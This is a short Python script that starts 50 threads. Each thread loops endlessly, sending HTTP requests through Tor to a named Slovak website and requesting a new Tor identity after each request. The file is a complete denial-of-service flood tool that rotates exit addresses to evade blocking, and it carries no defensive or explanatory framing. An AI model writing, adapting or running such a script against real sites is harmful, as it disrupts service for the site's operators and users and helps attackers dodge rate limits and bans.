from stem import Signal
from stem.control import Controller
import requests
import threading


proxies = {
    'http': 'socks5://127.0.0.1:9050',
    'https': 'socks5://127.0.0.1:9050'
}

def renew_connection():
    with Controller.from_port(port=9051) as controller:
        controller.authenticate(password='your_password')
        controller.signal(Signal.NEWNYM)


def start():
    while True:
        try:
            print(requests.get("https://camp-kosice.sk", proxies=proxies))
        except:
            pass
        renew_connection()


for i in range(50):
    t = threading.Thread(target=start)
    t.start()
